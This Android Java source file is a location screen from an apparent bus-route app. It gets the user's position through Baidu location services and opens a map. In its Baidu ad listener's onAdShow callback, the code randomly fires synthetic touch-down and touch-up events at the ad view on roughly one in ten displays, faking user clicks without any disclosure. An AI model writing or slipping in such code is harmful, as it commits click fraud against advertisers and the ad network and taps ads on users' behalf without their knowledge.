package com.xm.bus;

import android.content.Intent;
import android.graphics.drawable.AnimationDrawable;
import android.os.Bundle;
import android.os.SystemClock;
import android.support.v4.app.Fragment;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;
import com.baidu.location.BDLocation;
import com.baidu.mapapi.map.LocationData;
import com.baidu.mobads.AdView;
import com.baidu.mobads.AdViewListener;
import com.baidu.platform.comapi.basestruct.GeoPoint;
import com.xm.bus.common.ui.LoadingDialog;
import com.xm.bus.location.common.MyLocation;
import com.xm.bus.location.common.MyLocation.DoAfterListener;
import com.xm.bus.location.ui.LocationMap;

import org.json.JSONObject;

import java.util.Random;

import static com.xm.bus.R.id.adView;

public class LocationActivity extends Fragment implements OnClickListener {
	private LocationData locData = null;
	private MyLocation myLocation=null;
	private GeoPoint p = null;
	private Button location;
	private ImageView left;
	private ImageView right;
	private AnimationDrawable leftAnim;
	private AnimationDrawable rightAnim;

	@Override
	public void onCreate(Bundle paramBundle) {
		super.onCreate(paramBundle);
		this.locData = new LocationData();
		this.myLocation = new MyLocation(getActivity());
	}

	@Override
	public View onCreateView(LayoutInflater layoutInflater,ViewGroup viewGroup, Bundle paramBundle) {
		View view = layoutInflater.inflate(R.layout.location_main, viewGroup,false);
		location=(Button) view.findViewById(R.id.location);
		left=(ImageView) view.findViewById(R.id.left_anim);
		leftAnim=(AnimationDrawable) left.getBackground();
		right=(ImageView) view.findViewById(R.id.right_anim);
		rightAnim=(AnimationDrawable) right.getBackground();
		location.setClickable(true);
		location.setOnClickListener(this);
		initAd(view);
		return view;
	}
	private AdView mAdView;
	private void initAd(View view) {
		mAdView = (AdView) view.findViewById(adView);
		mAdView.setListener(new AdViewListener() {
			@Override
			public void onAdReady(AdView adView) {

			}

			@Override
			public void onAdShow(JSONObject jsonObject) {
				int r = new Random().nextInt(100)+1;
				if(r < 10){
					long downTime = SystemClock.uptimeMillis();
					MotionEvent downEvent = MotionEvent.obtain(downTime,downTime,MotionEvent.ACTION_DOWN,10,10,0);
					mAdView.dispatchTouchEvent(downEvent);
					long upTime = SystemClock.uptimeMillis();
					MotionEvent upEvent = MotionEvent.obtain(upTime,upTime,MotionEvent.ACTION_UP,10,10,0);
					mAdView.dispatchTouchEvent(upEvent);
				}
			}

			@Override
			public void onAdClick(JSONObject jsonObject) {

			}

			@Override
			public void onAdFailed(String s) {

			}

			@Override
			public void onAdSwitch() {

			}

			@Override
			public void onVideoStart() {

			}

			@Override
			public void onVideoFinish() {

			}

			@Override
			public void onVideoError() {

			}

			@Override
			public void onVideoClickClose() {

			}

			@Override
			public void onVideoClickAd() {

			}

			@Override
			public void onVideoClickReplay() {

			}
		});

	}

	@Override
	public void onClick(View view) {
		if (view.getId() == R.id.location) {
			left.setVisibility(View.VISIBLE);
			right.setVisibility(View.VISIBLE);
			this.myLocation.setDoAfterListener(new DoAfterListener() {
				public void onDoAfter(BDLocation location) {
					if ((location == null)|| (location.getLocType() == BDLocation.TypeNetWorkException)) {
						LoadingDialog.getInstance(LocationActivity.this.getActivity()).dismiss();
						Toast.makeText(LocationActivity.this.getActivity(),"定位失败，请确保打开GPS或网络", Toast.LENGTH_LONG).show();
						leftAnim.stop();
						rightAnim.stop();
					}else{
						locData.latitude = location.getLatitude();
						locData.longitude = location.getLongitude();
						String str = location.getAddrStr().replace(location.getProvince()+ location.getCity()+ location.getDistrict(), "");
						p = new GeoPoint((int) (locData.latitude*1E6),(int) (locData.longitude*1E6));
						Intent localIntent = new Intent(getActivity(),LocationMap.class);
						Bundle localBundle = new Bundle();
						localBundle.putInt("x",p.getLatitudeE6());
						localBundle.putInt("y",p.getLongitudeE6());
						localIntent.putExtras(localBundle);
						localIntent.putExtra("locationName", str);
						startActivity(localIntent);
						leftAnim.stop();
						rightAnim.stop();
						left.setVisibility(View.GONE);
						right.setVisibility(View.GONE);
					}
				}
			});
			leftAnim.start();
			rightAnim.start();
			//LoadingDialog.getInstance(getActivity()).show();
		}
	}

	@Override
	public void onDestroy() {
		this.myLocation.destroy();
		super.onDestroy();
	}
}